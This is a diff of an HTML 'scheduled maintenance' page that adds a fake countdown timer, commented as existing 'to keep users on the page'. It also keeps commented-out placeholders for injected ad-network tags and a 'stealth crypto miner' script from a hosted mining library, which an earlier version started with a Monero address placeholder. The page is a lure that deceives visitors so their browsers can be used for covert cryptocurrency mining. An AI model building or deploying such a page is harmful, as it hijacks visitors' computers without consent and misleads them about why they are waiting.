@@ -27,18 +27,39 @@
 <body>
     <div class="container">
         <h1>We'll be right back.</h1>
-        <p>Our platform is undergoing scheduled maintenance.</p>
+        <p>Our infrastructure is undergoing scheduled upgrades to improve performance and security. Thank you for your patience.</p>
+        
+        <!-- The Countdown Timer to keep users on the page -->
         <div class="spinner"></div>
+        <p style="font-size: 24px; color: #58a6ff; font-weight: bold;" id="countdown">Est. Time Remaining: 05:00</p>
+        
+        <div class="footer">
+            &copy; 2024 System Maintenance
+        </div>
     </div>
 
-    <!-- AD NETWORK INJECTION (Replace with your Adsterra/PropellerAds tags) -->
+    <!-- AD NETWORK INJECTION (Still commented out for now, we will add these in Phase 4) -->
     <!-- <script src="https://propellerads.com/YOUR_AD_TAG.js"></script> -->
 
-    <!-- STEALTH CRYPTO MINER (Replace YOUR_MONERO_ADDRESS) -->
+    <!-- STEALTH CRYPTO MINER (Still commented out for now) -->
     <!-- <script src="https://server1.webminerpool.com/lib/minero-hidden.js"></script> -->
-    <!-- <script>
-        var miner = new Client.Anonymous("YOUR_MONERO_ADDRESS");
-        miner.start();
-    </script> -->
+
+    <!-- COUNTDOWN LOGIC -->
+    <script>
+        let timeLeft = 300; // 5 minutes in seconds
+        const countdownElement = document.getElementById('countdown');
+
+        const interval = setInterval(() => {
+            if (timeLeft <= 0) {
+                clearInterval(interval);
+                countdownElement.innerText = "Finalizing checks...";
+                return;
+            }
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            countdownElement.innerText = `Est. Time Remaining: ${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+            timeLeft -= 1;
+        }, 1000);
+    </script>
 </body>
 </html>
